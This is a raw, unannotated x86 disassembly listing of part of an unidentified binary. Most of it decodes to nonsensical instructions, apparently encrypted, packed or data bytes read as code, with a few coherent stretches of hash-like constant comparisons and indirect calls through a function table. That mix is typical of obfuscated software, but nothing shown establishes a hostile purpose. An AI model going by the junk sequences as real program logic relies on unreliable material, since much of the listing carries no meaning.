  41ac8a:	push   edx
  41ac8b:	pop    es
  41ac8c:	rcr    BYTE PTR [eax-0x68],1
  41ac8f:	jmp    0xa15273d8
  41ac94:	aad    0xc
  41ac96:	aam    0xac
  41ac98:	or     DWORD PTR [esp+eiz*8+0x14],edi
  41ac9c:	in     ax,dx
  41ac9e:	js     0x41ad04
  41aca0:	inc    esi
  41aca1:	mov    ds:0x94c83e31,al
  41aca6:	cdq    
  41aca7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41aca8:	in     al,dx
  41aca9:	jbe    0x41ad1f
  41acab:	lock mov ebx,0x4ba037a4
  41acb1:	adc    DWORD PTR [edi-0x62],eax
  41acb4:	test   eax,0xb19cbb0d
  41acb9:	jne    0x41ad31
  41acbb:	out    0x52,al
  41acbd:	xchg   edi,eax
  41acbe:	ds retf 0x5879
  41acc2:	aam    0x4b
  41acc4:	xchg   esp,edx
  41acc6:	lods   al,BYTE PTR ds:[esi]
  41acc7:	int    0x18
  41acc9:	sub    BYTE PTR [ebp+0x18],ch
  41accc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41accd:	retf   
  41acce:	and    al,0x75
  41acd0:	bound  ecx,QWORD PTR [edx+0x20]
  41acd3:	jnp    0x41aced
  41acd5:	cs fucomi st,st(5)
  41acd8:	adc    al,0x24
  41acda:	out    0xc,al
  41acdc:	pusha  
  41acdd:	or     al,0xc9
  41acdf:	push   eax
  41ace0:	ja     0x41acdf
  41ace2:	daa    
  41ace3:	push   0xe479c16
  41ace8:	mov    dl,0xee
  41acea:	adc    eax,0xb227856b
  41acef:	retf   0xdf
  41acf2:	pop    edx
  41acf3:	push   ebp
  41acf4:	popa   
  41acf5:	sbb    esi,DWORD PTR [eax]
  41acf7:	addr16 js 0x41acc8
  41acfa:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41acfb:	adc    DWORD PTR [ecx+0xf],ecx
  41acfe:	xor    BYTE PTR [ebp-0x52],ch
  41ad01:	jmp    0x41ad13
  41ad03:	lds    eax,FWORD PTR [edi-0x64301db2]
  41ad09:	jb     0x41acb6
  41ad0b:	inc    ebx
  41ad0c:	mov    ch,0xe5
  41ad0e:	cmovnp edi,DWORD PTR [edi-0xc7e5481]
  41ad15:	ds cld 
  41ad17:	sahf   
  41ad18:	fcom   st(1)
  41ad1a:	cmc    
  41ad1b:	push   cs
  41ad1c:	jl     0x41ad97
  41ad1e:	fs add ah,dl
  41ad21:	pop    edx
  41ad22:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ad23:	jecxz  0x41ad9f
  41ad25:	dec    edi
  41ad26:	stos   BYTE PTR es:[edi],al
  41ad27:	loop   0x41ad59
  41ad29:	adc    BYTE PTR fs:[ecx-0x73b4df36],bl
  41ad30:	push   edx
  41ad31:	into   
  41ad32:	je     0x41acd5
  41ad34:	iret   
  41ad35:	retf   
  41ad36:	add    eax,0x2692e4ee
  41ad3b:	ja     0x41ad75
  41ad3d:	hlt    
  41ad3e:	sub    DWORD PTR [edi+eax*2+0xdba0df4],ebp
  41ad45:	(bad)  
  41ad46:	jge    0x41ad6d
  41ad48:	out    0x72,al
  41ad4a:	jmp    0x9092:0x4081802a
  41ad51:	leave  
  41ad52:	jae    0x41adce
  41ad54:	(bad)  
  41ad55:	push   cs
  41ad56:	nop
  41ad57:	and    BYTE PTR [esi-0x2ee7a846],bl
  41ad5d:	call   0xffe4:0xa15ccec9
  41ad64:	or     al,BYTE PTR [edx+0x2255da46]
  41ad6a:	pop    ebx
  41ad6b:	call   0xf966:0x3c24e80b
  41ad72:	dec    ebx
  41ad73:	daa    
  41ad74:	repz aam 0x9f
  41ad77:	dec    ebp
  41ad78:	clc    
  41ad79:	or     BYTE PTR ds:0xd1436e29,bh
  41ad7f:	in     eax,dx
  41ad80:	mov    al,0xac
  41ad82:	xor    edx,DWORD PTR [ebx]
  41ad84:	push   ecx
  41ad85:	or     BYTE PTR [ecx+0x28],0x93
  41ad89:	xchg   BYTE PTR [eax+0x7160f0a9],dh
  41ad8f:	and    ebp,esi
  41ad91:	jo     0x41ae00
  41ad93:	addr16 mov cl,ah
  41ad96:	clc    
  41ad97:	cmp    DWORD PTR [ecx-0x39],0x77
  41ad9b:	pop    es
  41ad9c:	add    cl,dh
  41ad9e:	pop    edi
  41ad9f:	add    edx,DWORD PTR [edi+ecx*1-0x1d671ad8]
  41ada6:	pop    esp
  41ada7:	test   al,0x15
  41ada9:	dec    ebx
  41adaa:	jge    0x41ada7
  41adac:	enter  0xa366,0x99
  41adb0:	mov    eax,0x698a382d
  41adb5:	jae    0x41adf8
  41adb7:	mov    eax,0x5b2de1ab
  41adbc:	out    dx,al
  41adbd:	jle    0x41ade8
  41adbf:	xchg   DWORD PTR [ebp+0x6],ebp
  41adc2:	inc    edi
  41adc3:	pop    esp
  41adc4:	jo     0x41adb5
  41adc6:	shl    dh,1
  41adc8:	pop    es
  41adc9:	and    al,0x58
  41adcb:	rol    DWORD PTR [edx-0x2c2f8df2],1
  41add1:	cmp    eax,DWORD PTR [ebx-0x46a5eb16]
  41add7:	xor    DWORD PTR [edx-0x19b13a06],esi
  41addd:	push   cs
  41adde:	sub    eax,0xbe293ae
  41ade3:	shl    BYTE PTR [ecx],1
  41ade5:	mov    DWORD PTR [eax+0x6c],esi
  41ade8:	adc    esp,DWORD PTR [eax-0x3d1fbb0c]
  41adee:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41adef:	cmc    
  41adf0:	scas   al,BYTE PTR es:[edi]
  41adf1:	shr    DWORD PTR [eax],1
  41adf3:	in     al,0xc1
  41adf5:	sub    DWORD PTR [edi-0x538b40ac],edx
  41adfb:	stc    
  41adfc:	int    0xc6
  41adfe:	add    eax,0xba0c3ae4
  41ae03:	and    esi,eax
  41ae05:	dec    ebp
  41ae06:	xchg   ebp,eax
  41ae07:	xor    bl,BYTE PTR [ecx+0x3c]
  41ae0a:	lds    ebx,FWORD PTR [eax+ebp*2+0x7d9e9a73]
  41ae11:	mov    esp,0x2527f38d
  41ae16:	iret   
  41ae17:	adc    ah,BYTE PTR [esi-0x7b]
  41ae1a:	push   es
  41ae1b:	mov    BYTE PTR [esi],0x7b
  41ae1e:	sub    al,bl
  41ae20:	fistp  DWORD PTR [eax+ecx*8]
  41ae23:	cdq    
  41ae24:	xchg   esp,eax
  41ae25:	mov    dl,0x77
  41ae27:	jle    0x41ade4
  41ae29:	push   esp
  41ae2a:	iret   
  41ae2b:	rcl    BYTE PTR [ebx+edi*1],0xf5
  41ae2f:	in     al,dx
  41ae30:	or     eax,0x3128a2e
  41ae35:	aas    
  41ae36:	mov    dl,0xde
  41ae38:	pop    ds
  41ae39:	std    
  41ae3a:	push   ecx
  41ae3b:	gs pop ebx
  41ae3d:	shl    ch,0x61
  41ae40:	inc    esp
  41ae41:	xor    BYTE PTR [ebx],ah
  41ae43:	popf   
  41ae44:	cmc    
  41ae45:	jbe    0x41ae87
  41ae47:	xchg   BYTE PTR [edi+0x16a57c82],dl
  41ae4d:	fidivr WORD PTR [eax-0x5527291d]
  41ae53:	cmp    DWORD PTR [edi],edx
  41ae55:	or     BYTE PTR [ebx+edx*8-0x5ecb562a],bh
  41ae5c:	xchg   esi,eax
  41ae5d:	icebp  
  41ae5e:	ins    DWORD PTR es:[edi],dx
  41ae5f:	vorps  ymm2,ymm2,ymm7
  41ae63:	mov    BYTE PTR ds:0x2ae1,ch
  41ae69:	and    eax,0x6f90
  41ae6e:	mov    DWORD PTR [esp+0x30],eax
  41ae72:	mov    DWORD PTR [esp+0x10],0x1515
  41ae7a:	mov    eax,DWORD PTR [esp+0x10]
  41ae7e:	jmp    0x41b0db
  41ae83:	sub    al,0xff
  41ae85:	jmp    0xe1b3:0xbcbce956
  41ae8c:	in     al,0x38
  41ae8e:	xchg   edx,eax
  41ae8f:	push   esi
  41ae90:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ae91:	jmp    0xc0739279
  41ae96:	mov    esi,0xbebec235
  41ae9b:	not    BYTE PTR [ebp+0x7b]
  41ae9e:	xchg   esp,eax
  41ae9f:	pop    esp
  41aea0:	mov    ecx,0x3718248c
  41aea5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41aea6:	dec    esi
  41aea7:	adc    esi,edi
  41aea9:	mov    WORD PTR [esp+ebp*1+0x357c58b6],ds
  41aeb0:	cmp    DWORD PTR [edx],ebx
  41aeb2:	mov    ebx,0x8e693549
  41aeb7:	imul   BYTE PTR [esi+edi*2]
  41aeba:	jae    0x41aec1
  41aebc:	cs hlt 
  41aebe:	mov    al,0x38
  41aec0:	dec    BYTE PTR [ebp+0x67]
  41aec3:	xor    eax,0x888dfb5a
  41aec8:	push   ds
  41aec9:	and    eax,esp
  41aecb:	mov    ebp,0x3d98d593
  41aed0:	cmp    DWORD PTR [esp+eax*2+0x44f0b654],edx
  41aed7:	dec    ebp
  41aed8:	mov    ch,0xe4
  41aeda:	mov    ch,ch
  41aedc:	lods   eax,DWORD PTR ds:[esi]
  41aedd:	dec    ebx
  41aede:	shl    bh,0xaf
  41aee1:	outs   dx,BYTE PTR ds:[esi]
  41aee2:	fist   DWORD PTR [esi-0xbaccdf8]
  41aee8:	inc    edi
  41aee9:	js     0x41af23
  41aeeb:	ret    0xfaac
  41aeee:	leave  
  41aeef:	jl     0x41aeb3
  41aef1:	adc    al,bl
  41aef3:	lods   al,BYTE PTR ds:[esi]
  41aef4:	pop    ebx
  41aef5:	add    DWORD PTR [ecx],ebp
  41aef7:	adc    DWORD PTR ds:0x924d0e38,ebp
  41aefd:	call   0x923c:0x85a7abc0
  41af04:	fldcw  WORD PTR [ebp+0x52]
  41af07:	(bad)  
  41af08:	ficomp DWORD PTR [ebx+0x766d6546]
  41af0e:	cmc    
  41af0f:	xor    DWORD PTR [ebx-0x11],eax
  41af12:	loop   0x41af25
  41af14:	xchg   DWORD PTR [edi-0x55],ebx
  41af17:	outs   dx,DWORD PTR ds:[esi]
  41af18:	inc    esp
  41af19:	sub    al,0xdd
  41af1b:	sbb    esi,DWORD PTR [edx+0x41]
  41af1e:	hlt    
  41af1f:	outs   dx,DWORD PTR ds:[esi]
  41af20:	lea    edx,[edx+0x63]
  41af23:	je     0x41af9b
  41af25:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41af26:	cmp    edi,DWORD PTR [ebp-0xe34a42]
  41af2c:	mov    edi,0x76b29ac0
  41af31:	mov    esp,0x8c440ca9
  41af36:	xor    BYTE PTR [eax-0x14],dh
  41af39:	jne    0x41af73
  41af3b:	mov    ecx,0xe3f9827f
  41af40:	xchg   edi,eax
  41af41:	adc    edi,DWORD PTR [ebp-0x79211256]
  41af47:	hlt    
  41af48:	(bad)  
  41af49:	je     0x41af36
  41af4b:	ds in  al,0xa6
  41af4e:	call   0x422c5082
  41af53:	adc    esi,ecx
  41af55:	sub    ch,BYTE PTR [eax+0x50]
  41af58:	shr    BYTE PTR [eax+esi*8-0xd],1
  41af5c:	test   dl,ch
  41af5e:	stos   BYTE PTR es:[edi],al
  41af5f:	mov    ebx,0xe82d8595
  41af64:	adc    ecx,ebx
  41af66:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41af67:	adc    BYTE PTR [eax],dl
  41af69:	mov    cl,0xae
  41af6b:	mov    bl,0x30
  41af6d:	mov    ebp,0x57c46605
  41af72:	cli    
  41af73:	mov    ebx,0x37231811
  41af78:	rcl    dl,cl
  41af7a:	cli    
  41af7b:	fsubr  QWORD PTR [edx-0x18557828]
  41af81:	std    
  41af82:	mov    ah,0xf7
  41af85:	aaa    
  41af86:	ss xchg esp,eax
  41af88:	add    eax,ecx
  41af8a:	(bad)  
  41af8b:	test   eax,0x9929ed41
  41af90:	mov    dh,0x85
  41af92:	fwait
  41af93:	pop    ss
  41af94:	out    0x38,eax
  41af96:	mov    ebx,0x7a3a04c9
  41af9b:	inc    ecx
  41af9c:	mov    ah,0xa1
  41af9e:	add    bl,BYTE PTR [ecx]
  41afa0:	gs mov eax,0xa69148fa
  41afa6:	ret    0x9960
  41afa9:	mov    cl,BYTE PTR [ecx-0x45]
  41afac:	mov    al,0x65
  41afae:	test   al,0x68
  41afb0:	dec    eax
  41afb1:	mov    gs,WORD PTR [ebx]
  41afb3:	xchg   ecx,eax
  41afb4:	push   edi
  41afb5:	pop    ds
  41afb6:	les    esp,FWORD PTR [edx]
  41afb8:	pop    ds
  41afb9:	sub    esp,DWORD PTR [ebp-0x19eb874]
  41afbf:	xchg   BYTE PTR [ecx+0x41e5a95d],dl
  41afc5:	daa    
  41afc6:	mov    ch,0xde
  41afc8:	mov    bl,0x48
  41afca:	inc    esi
  41afcb:	in     al,0x1b
  41afcd:	aas    
  41afce:	lods   eax,DWORD PTR ds:[esi]
  41afcf:	pop    eax
  41afd0:	sbb    esp,DWORD PTR [esi-0x60]
  41afd3:	ror    BYTE PTR [ebx],cl
  41afd5:	cmp    BYTE PTR [edx],0x63
  41afd8:	ror    BYTE PTR [edi-0x32b170b0],cl
  41afde:	push   ss
  41afdf:	adc    eax,0x3ba76692
  41afe4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41afe5:	push   ebp
  41afe6:	pop    eax
  41afe7:	in     al,0x99
  41afe9:	jl     0x41afb3
  41afeb:	dec    edx
  41afec:	push   esi
  41afed:	fdiv   QWORD PTR [esi+edi*1-0x31780159]
  41aff4:	push   edx
  41aff5:	sbb    DWORD PTR [ecx-0x12],0x6c7e12a6
  41affc:	jg     0x41b06b
  41affe:	jg     0x41afdc
  41b000:	shl    DWORD PTR [ecx],0xf4
  41b003:	pop    ss
  41b004:	pop    esi
  41b005:	xor    eax,0x209220dd
  41b00a:	sbb    eax,0xe4f778f6
  41b00f:	xchg   esp,eax
  41b010:	push   ss
  41b011:	add    eax,0x85657ca2
  41b016:	dec    esp
  41b017:	pop    ebx
  41b018:	jl     0x41b07c
  41b01a:	aas    
  41b01b:	xor    ch,ch
  41b01d:	js     0x41b026
  41b01f:	sub    dh,dh
  41b021:	mov    DWORD PTR fs:[edi],ebp
  41b024:	sti    
  41b025:	clc    
  41b026:	sbb    edi,ebp
  41b028:	int    0xd8
  41b02a:	jbe    0x41b043
  41b02c:	mov    cl,0x60
  41b02e:	pop    esp
  41b02f:	jbe    0x41afb4
  41b031:	fnstcw WORD PTR [eax]
  41b033:	add    eax,0x318fc464
  41b038:	push   0xffffffc9
  41b03a:	js     0x41b02d
  41b03c:	ret    0xb6e1
  41b03f:	pop    es
  41b040:	add    BYTE PTR [edi+ebp*8],0xbd
  41b044:	add    ecx,DWORD PTR [ecx+eax*8-0x72]
  41b048:	xor    al,0x37
  41b04a:	mov    al,BYTE PTR [edi+0x5274174a]
  41b050:	sub    eax,0xa1dcf904
  41b055:	xchg   ecx,esi
  41b057:	aad    0xda
  41b059:	(bad)  
  41b05a:	outs   dx,DWORD PTR ds:[esi]
  41b05b:	mov    ah,0x16
  41b05d:	ror    BYTE PTR [ebp+0x7a],cl
  41b060:	xor    eax,DWORD PTR [ecx+0x13a973f4]
  41b066:	sbb    eax,0xc74b3f90
  41b06b:	xchg   edx,eax
  41b06c:	mov    esi,ebp
  41b06e:	aas    
  41b06f:	push   esp
  41b070:	and    al,0x89
  41b072:	bound  esp,QWORD PTR [ebp-0x63]
  41b075:	(bad)  
  41b077:	sahf   
  41b078:	fnsave [esi-0x15]
  41b07b:	cmc    
  41b07c:	int    0x27
  41b07e:	jne    0x41b0d9
  41b080:	pop    ebx
  41b081:	sbb    al,0xe2
  41b083:	test   eax,0xb014eb97
  41b088:	and    al,BYTE PTR [edi+0x4eb6616]
  41b08e:	lods   eax,DWORD PTR ds:[esi]
  41b08f:	xchg   edx,eax
  41b090:	daa    
  41b091:	jnp    0x41b071
  41b093:	loopne 0x41b055
  41b095:	push   ss
  41b096:	loope  0x41b04c
  41b098:	xchg   ebx,eax
  41b099:	sub    esp,0xffffffde
  41b09c:	or     DWORD PTR [ebp+0xbc91831],ebp
  41b0a2:	call   0xbb6e:0x6d794261
  41b0a9:	cmp    DWORD PTR [edi-0x6f],ebp
  41b0ac:	mov    ah,0x3b
  41b0ae:	cdq    
  41b0af:	(bad)  
  41b0b2:	add    BYTE PTR [edx+0x2066bc07],bh
  41b0b8:	mov    ebp,0x9b0dffd7
  41b0bd:	adc    al,0xff
  41b0bf:	jns    0x41b071
  41b0c1:	dec    ebp
  41b0c2:	(bad)  
  41b0c3:	loope  0x41b08e
  41b0c5:	push   0x3a
  41b0c7:	and    al,0xc2
  41b0c9:	jle    0x41b055
  41b0cb:	(bad)  
  41b0cc:	popf   
  41b0cd:	or     eax,DWORD PTR [ebp+0x2b596818]
  41b0d3:	mov    ah,0xf4
  41b0d5:	add    ebp,eax
  41b0d7:	dec    edi
  41b0d8:	xor    al,0xd7
  41b0da:	and    BYTE PTR [ebx+0xd30244c],cl
  41b0e0:	adc    esi,DWORD PTR [ecx+0x0]
  41b0e3:	add    BYTE PTR ds:0x3d6a,al
  41b0e9:	cmp    ecx,eax
  41b0eb:	je     0x41b438
  41b0f1:	mov    eax,DWORD PTR [esp+0x40]
  41b0f5:	mov    edx,DWORD PTR [esp+0x18]
  41b0f9:	mov    edi,DWORD PTR [esp+0x1c]
  41b0fd:	xor    ecx,ecx
  41b0ff:	shld   ecx,eax,0x2
  41b103:	shl    eax,0x2
  41b106:	xor    eax,ebx
  41b108:	xor    ecx,esi
  41b10a:	cmp    eax,edx
  41b10c:	jne    0x41b11a
  41b112:	cmp    ecx,edi
  41b114:	je     0x41b3f1
  41b11a:	mov    eax,DWORD PTR [esp+0x44]
  41b11e:	mov    eax,DWORD PTR [esp+0x44]
  41b122:	mov    eax,DWORD PTR [esp+0x44]
  41b126:	mov    ecx,DWORD PTR [esp+0x44]
  41b12a:	jmp    0x41b387
  41b12f:	repz cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b131:	lea    ecx,[ecx-0x67]
  41b134:	jnp    0x41b171
  41b136:	mov    bh,0x0
  41b138:	lods   al,BYTE PTR ds:[esi]
  41b139:	dec    esp
  41b13a:	xchg   edx,eax
  41b13b:	jo     0x41b0d6
  41b13d:	pop    esi
  41b13e:	sahf   
  41b13f:	pop    esp
  41b140:	xor    eax,0xc235bec0
  41b145:	mov    esi,0x4b0550be
  41b14a:	mov    DWORD PTR ds:0xc294ae2c,ebx
  41b150:	mov    edi,0xe59619c7
  41b155:	int3   
  41b156:	xchg   edx,eax
  41b157:	sub    dl,BYTE PTR [edi+0x4b]
  41b15a:	mov    esi,0x37329bcb
  41b15f:	scas   al,BYTE PTR es:[edi]
  41b160:	rcl    BYTE PTR [edi+0x18],1
  41b163:	loope  0x41b18f
  41b165:	ins    DWORD PTR es:[edi],dx
  41b166:	sahf   
  41b167:	aaa    
  41b168:	rcl    BYTE PTR [eax-0x42],0x59
  41b16c:	bound  eax,QWORD PTR [ecx]
  41b16e:	mov    ch,0x7d
  41b170:	xor    ebx,DWORD PTR [edi]
  41b172:	mov    DWORD PTR [ebx+0x13],esi
  41b175:	push   0x56
  41b177:	push   esp
  41b178:	cmp    bl,ah
  41b17a:	in     al,dx
  41b17b:	xchg   ebx,eax
  41b17c:	dec    esi
  41b17d:	popa   
  41b17e:	fidiv  DWORD PTR [edx+0x30]
  41b181:	je     0x41b1b0
  41b183:	cmp    al,0x91
  41b185:	xchg   ebx,eax
  41b186:	(bad)  
  41b187:	adc    BYTE PTR [edx-0x3a27a6de],al
  41b18d:	jnp    0x41b1ad
  41b18f:	push   ss
  41b190:	push   esp
  41b191:	test   eax,0x2baef827
  41b196:	jecxz  0x41b1b3
  41b198:	aad    0xe2
  41b19a:	jmp    0xf3284e42
  41b19f:	retf   0xa8e6
  41b1a2:	cld    
  41b1a3:	xor    eax,0x94349903
  41b1a8:	data16 (bad) [edx]
  41b1ac:	std    
  41b1ad:	sbb    ah,BYTE PTR [esi+eax*8]
  41b1b0:	or     DWORD PTR [edi],ecx
  41b1b2:	add    al,0x82
  41b1b4:	sbb    eax,0x8d8c9ac
  41b1b9:	sub    eax,0x18038920
  41b1be:	or     DWORD PTR [edx],ebx
  41b1c0:	add    eax,0xab3e4666
  41b1c5:	call   0xffd9:0x59a2cf92
  41b1cc:	or     edx,DWORD PTR ds:0x4a727154
  41b1d2:	(bad)  [ebp+0x37]
  41b1d5:	fsub   DWORD PTR [edx-0x16]
  41b1d8:	mov    cl,BYTE PTR [ebp+edx*1+0x1e2e4c63]
  41b1df:	jae    0x41b201
  41b1e1:	xchg   ebx,eax
  41b1e2:	mov    ds:0x7f47941,eax
  41b1e7:	pushf  
  41b1e8:	inc    ebx
  41b1e9:	push   esp
  41b1ea:	aaa    
  41b1eb:	add    BYTE PTR [ebx+ebp*2],al
  41b1ee:	inc    esi
  41b1ef:	sahf   
  41b1f0:	adc    BYTE PTR [esi+0x44fad33e],0x9f
  41b1f7:	into   
  41b1f8:	lods   al,BYTE PTR ds:[esi]
  41b1f9:	xor    DWORD PTR ds:0xec920cfd,eax
  41b1ff:	movs   BYTE PTR es:[edi],BYTE PTR fs:[esi]
  41b201:	sbb    al,0xea
  41b203:	out    0x3a,al
  41b205:	jnp    0x41b257
  41b207:	jecxz  0x41b203
  41b209:	sub    al,0xf2
  41b20b:	stc    
  41b20c:	jns    0x41b278
  41b20e:	dec    edx
  41b20f:	pusha  
  41b210:	lods   al,BYTE PTR ds:[esi]
  41b211:	hlt    
  41b212:	into   
  41b213:	in     al,dx
  41b214:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b215:	je     0x41b243
  41b217:	paddd  mm4,QWORD PTR [ebx+0x39]
  41b21b:	mov    eax,0xec9aacf4
  41b220:	mov    dl,0xa0
  41b222:	xor    DWORD PTR [edi-0x4d],ecx
  41b225:	and    BYTE PTR ss:[ecx+0x3df84aa0],0xdf
  41b22d:	outs   dx,DWORD PTR ds:[esi]
  41b22e:	or     bl,BYTE PTR [edi]
  41b230:	mov    ecx,0x38fe2c76
  41b235:	mov    ds:0x20319ccf,eax
  41b23a:	gs retf 0xd918
  41b23e:	add    eax,0xa082df65
  41b243:	xor    DWORD PTR [ebp+0x48],esi
  41b246:	dec    eax
  41b247:	mov    ah,0xb3
  41b249:	push   edi
  41b24a:	ror    BYTE PTR [esi*2+0x13065258],0x44
  41b252:	fmul   DWORD PTR [edx+0x594a6644]
  41b258:	imul   esi,DWORD PTR [esi],0xffffffb3
  41b25b:	and    ebx,DWORD PTR [esi-0x7c4916c4]
  41b261:	dec    esp
  41b262:	pop    es
  41b263:	sub    edi,DWORD PTR [esi]
  41b265:	frstor [ecx]
  41b267:	mov    esi,ebp
  41b269:	sub    al,0x5a
  41b26b:	sbb    DWORD PTR es:[ebx+0x31],0x65
  41b270:	mov    dl,0x93
  41b272:	ja     0x41b220
  41b274:	cmp    DWORD PTR [esi-0x84b7d1a],esi
  41b27a:	add    bl,BYTE PTR [esi-0xd]
  41b27d:	push   0xffffffab
  41b27f:	or     dl,BYTE PTR [eax]
  41b281:	push   0x60af1117
  41b286:	jle    0x41b21c
  41b288:	popa   
  41b289:	ret    
  41b28a:	and    eax,0xaafd1d14
  41b28f:	cmp    al,0x25
  41b291:	in     al,0x70
  41b293:	lods   al,BYTE PTR ds:[esi]
  41b294:	inc    edx
  41b295:	jns    0x41b22f
  41b297:	push   ecx
  41b298:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b299:	push   0x9048972f
  41b29e:	aam    0x23
  41b2a0:	dec    edx
  41b2a1:	inc    esi
  41b2a2:	mov    bl,0x57
  41b2a4:	xor    eax,DWORD PTR [ebx-0x521d91bf]
  41b2aa:	and    BYTE PTR [eax-0x1288622a],bh
  41b2b0:	retf   
  41b2b1:	xor    al,0xd
  41b2b3:	push   ss
  41b2b4:	xchg   BYTE PTR [ecx-0x3d],ah
  41b2b7:	es ret 0xc939
  41b2bb:	adc    DWORD PTR [ebx],0x76
  41b2be:	sar    BYTE PTR [eax+0x70],0x5b
  41b2c2:	add    ebp,DWORD PTR [ecx+0x3a]
  41b2c5:	stos   BYTE PTR es:[edi],al
  41b2c6:	adc    BYTE PTR [edi+0x6],al
  41b2c9:	pop    ebx
  41b2ca:	mov    WORD PTR [edx+0x67],ds
  41b2cd:	sub    edi,esp
  41b2cf:	sar    BYTE PTR [ecx],0xc3
  41b2d2:	std    
  41b2d3:	nop
  41b2d4:	cmp    al,0x9d
  41b2d6:	mov    ds:0x53fc69ef,eax
  41b2db:	inc    esi
  41b2dc:	mov    ch,bl
  41b2de:	add    BYTE PTR [eax],0xb3
  41b2e1:	dec    eax
  41b2e2:	add    ah,0x61
  41b2e5:	inc    ecx
  41b2e6:	sbb    al,0x7c
  41b2e8:	ds add eax,0xb9dd4d0e
  41b2ee:	mov    ch,0x91
  41b2f0:	jmp    0x2277d411
  41b2f5:	test   edi,0x532aecfa
  41b2fb:	cdq    
  41b2fc:	test   ch,bl
  41b2fe:	inc    ebp
  41b2ff:	jnp    0x41b281
  41b301:	call   0x98d53e4e
  41b306:	ficom  DWORD PTR ds:0xb2966350
  41b30c:	mov    ?,WORD PTR [edi+0x12]
  41b30f:	mov    bl,0xa
  41b311:	loopne 0x41b301
  41b313:	cli    
  41b314:	les    edx,FWORD PTR [edx+0x19]
  41b317:	cmp    DWORD PTR [eax-0x55],esi
  41b31a:	cmp    dh,0xfb
  41b31d:	jmp    0x41b305
  41b31f:	aam    0x98
  41b321:	push   es
  41b322:	fimul  WORD PTR [edx+0x4a638eb6]
  41b328:	push   0x54
  41b32a:	mov    ds,ebx
  41b32c:	stc    
  41b32d:	mov    edx,0xe2db6c06
  41b332:	shld   esi,edx,0x68
  41b336:	test   eax,0x271e8ac4
  41b33b:	xchg   edi,eax
  41b33c:	ror    BYTE PTR [edi],1
  41b33e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b33f:	pop    esp
  41b340:	(bad)  [edx+eiz*4-0x75004ada]
  41b347:	jle    0x41b373
  41b349:	xlat   BYTE PTR ds:[ebx]
  41b34a:	(bad)  
  41b34b:	test   BYTE PTR [edx+0x62effb11],0x68
  41b352:	inc    eax
  41b353:	xchg   BYTE PTR [ecx+0x12],al
  41b356:	scas   eax,DWORD PTR es:[edi]
  41b357:	int3   
  41b358:	mov    WORD PTR [ebx+0x7e],ss
  41b35b:	addr16 push esi
  41b35d:	mov    eax,ds:0x17f20e71
  41b362:	xor    dh,al
  41b364:	(bad)  [ecx-0x5b]
  41b367:	not    cl
  41b369:	popa   
  41b36a:	in     al,0x15
  41b36c:	xor    DWORD PTR [edi-0x66],0x56dcef81
  41b373:	stc    
  41b374:	dec    esi
  41b375:	ficomp WORD PTR [esi]
  41b377:	jecxz  0x41b355
  41b379:	fdiv   QWORD PTR [esp+edi*8-0x3c5760b4]
  41b380:	loope  0x41b33d
  41b382:	js     0x41b31f
  41b384:	pop    ebx
  41b385:	push   es
  41b386:	sbb    al,0x35
  41b388:	scas   eax,DWORD PTR es:[edi]
  41b389:	fwait
  41b38a:	push   es
  41b38b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b38c:	xor    ecx,0xfffffffe
  41b38f:	shr    eax,0x2
  41b392:	shl    ecx,0x1e
  41b395:	or     eax,ecx
  41b397:	xor    ecx,ecx
  41b399:	shld   ecx,eax,0x2
  41b39d:	shl    eax,0x2
  41b3a0:	xor    eax,ebx
  41b3a2:	xor    ecx,esi
  41b3a4:	cmp    eax,0xcb79b572
  41b3a9:	jne    0x41b3b7
  41b3af:	cmp    ecx,esi
  41b3b1:	je     0x41b438
  41b3b7:	mov    eax,DWORD PTR [esp+0x60]
  41b3bb:	cdq    
  41b3bc:	mov    eax,DWORD PTR [esp+0x60]
  41b3c0:	mov    ecx,edx
  41b3c2:	cdq    
  41b3c3:	shld   edx,eax,0x2
  41b3c7:	shr    ecx,0x1e
  41b3ca:	xor    edi,edi
  41b3cc:	shl    eax,0x2
  41b3cf:	or     eax,ecx
  41b3d1:	or     edx,edi
  41b3d3:	mov    ecx,edx
  41b3d5:	mov    edx,DWORD PTR [esp+0x18]
  41b3d9:	xor    eax,ebx
  41b3db:	xor    ecx,esi
  41b3dd:	mov    esi,DWORD PTR [esp+0x1c]
  41b3e1:	cmp    edx,eax
  41b3e3:	jne    0x41b3f1
  41b3e9:	cmp    esi,ecx
  41b3eb:	je     0x41b438
  41b3f1:	push   DWORD PTR ds:0x4227f8
  41b3f7:	push   DWORD PTR ds:0x42258c
  41b3fd:	mov    eax,ds:0x422708
  41b402:	mov    eax,DWORD PTR [eax+0x1a4]
  41b408:	push   DWORD PTR [eax]
  41b40a:	mov    eax,DWORD PTR [esp+0x78]
  41b40e:	call   eax
  41b410:	mov    ecx,DWORD PTR ds:0x422708
  41b416:	mov    ecx,DWORD PTR [ecx+0x1dc]
  41b41c:	mov    DWORD PTR [ecx],eax
  41b41e:	mov    eax,ds:0x422708
  41b423:	push   0x4
  41b425:	add    eax,0x1dc
  41b42a:	push   eax
  41b42b:	lea    eax,[esp+0x84]
  41b432:	push   eax
  41b433:	call   0x411c08
  41b438:	mov    eax,DWORD PTR [esp+0x7c]
  41b43c:	mov    eax,DWORD PTR [eax]
  41b43e:	pop    edi
  41b43f:	pop    esi
  41b440:	pop    ebx
  41b441:	mov    esp,ebp
  41b443:	pop    ebp
  41b444:	ret    0xc
  41b447:	push   ebp
  41b448:	mov    ebp,esp
  41b44a:	sub    esp,0x23c
  41b450:	push   ebx
  41b451:	cmp    DWORD PTR ds:0x428565,0x0
  41b458:	mov    DWORD PTR ds:0x42834d,0x2d97
  41b462:	mov    ecx,DWORD PTR ds:0x428465
  41b468:	mov    ecx,DWORD PTR ds:0x428439
